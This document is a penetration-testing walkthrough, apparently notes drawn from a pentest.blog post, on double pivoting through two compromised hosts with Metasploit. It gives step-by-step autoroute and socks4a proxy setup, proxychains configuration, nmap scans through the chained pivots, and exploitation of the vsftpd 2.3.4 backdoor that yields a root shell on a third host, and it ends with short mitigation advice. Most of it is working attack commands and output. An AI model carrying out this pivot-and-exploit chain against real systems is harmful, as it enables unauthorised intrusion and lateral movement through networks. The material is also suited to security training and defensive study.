Refer to these links: https://pentest.blog/explore-hidden-networks-with-double-pivoting/			&				https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/

The network scenario above + the resolution of the problem is from this blog: https://pentest.blog/explore-hidden-networks-with-double-pivoting/	

**CONSIDER THE FOLLWING NETWORK SCENARIO:**

```
Attacker(172.16.0.20) -> 172.16.0.11(Victim 1)
                         7.7.7.11    -> 7.7.7.20(Victim 2)
                                        8.8.8.3    -> 8.8.8.9(Victim 3)
```

We, as the Attacker(172.16.0.20), want to compromise Victim 3(8.8.8.9).

To do so our traffic must be proxied through Victim 1 and Victim 2. Supose that we already have a meterpreter shell for Victim 1 and Victim 2. Victim 2 was compromised through a proxy on 127.0.0.1:1080 TCP.

*Setting the proxy for Victim 1:*

```
1. meterpreter > ipconfig
172.16.0.11
7.7.7.11

2. meterpreter > run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11

3. meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
[*] ARP Scanning 7.7.7.0/24
[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe 
[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 
[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 
[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5

4. meterpreter > bg
[*] Backgrounding session 1...

5. msf > use auxiliary/server/socks4a

6. msf auxiliary(socks4a) > set srvhost 172.16.0.20

7. msf auxiliary(socks4a) > set srvport 1080

8. msf auxiliary(socks4a) > run

9. Add this line to the /etc/proxychains.conf file
socks4  172.16.0.20 1080
```
Now we are able to access the 7.7.7.0/24 network using proxychains:

```
~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:80-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
...
...
```

*Setting the proxy for Victim 2:*

```
1. meterpreter > ipconfig
7.7.7.20
8.8.8.3

2. meterpreter > run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
[*] ARP Scanning 8.8.8.0/24
[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb 
[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 
[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c 
[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1

3. meterpreter > run autoroute -s 8.8.8.0/24
[*] Adding a route to 8.8.8.0/255.255.255.0...
[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
[*] Use the -p option to list all active routes

4. meterpreter > bg
[*] Backgrounding session 2...

5. msf > route print
 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 1
 8.8.8.0 255.255.255.0 Session 2

6. msf > use auxiliary/server/socks4a

7. msf auxiliary(socks4a) > set SRVPORT 1081

8. msf auxiliary(socks4a) > set SRVHOST 172.16.0.20

9. msf auxiliary(socks4a) > run

10. Add this lines to the /etc/proxychains.conf
dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks4  172.16.0.20 1080  # First Pivot
socks4  172.16.0.20 1081  # Second Pivot
```

Now we can access the 8.8.8.0/24 subnet using proxychains:

```
~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
NSE: Loaded 36 scripts for scanning.
Initiating Connect Scan
Scanning 8.8.8.9 [4 ports]
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:21-<><>-OK
Discovered open port 21/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:23-<><>-OK
Discovered open port 23/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:22-<><>-OK
Discovered open port 22/tcp on 8.8.8.9
|D-chain|-<>-172.16.0.20:1080-<>-172.16.0.20:1081-<><>-8.8.8.9:80-<><>-OK
...
...
...
```
Proxying traffic between 2 different proxies was posible because the proxyphains tool connects the proxy servers and transmits the connection end to end. Also note the "-sT" parameter on the nmap scans, indicating nmap to pass traffic through the proxy.

*Compromising Victim 3:*

```
msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port
Exploit target:
   Id  Name
   --  ----
   0   Automatic

msf exploit(vsftpd_234_backdoor) > set rhost 8.8.8.9
rhost => 8.8.8.9

msf exploit(vsftpd_234_backdoor) > run
[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 8.8.8.9:21 - USER: 331 Please specify the password.
[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (Local Pipe -> Remote Pipe)

ifconfig
8.8.8.9
```

**MITIGATIONS:**

(I've write this mitigations down here, in case you have any problems using the solution explained so that you have an understanding of what could be happening. Also, credit to this blog: https://pentest.blog/explore-hidden-networks-with-double-pivoting/ for providing this mitigations).

- Systems that contain multiple NICs and provide DMZ access should be removed from the existing network structure.
- Systems in the DMZ structure should only be accessed over DMZ structures.
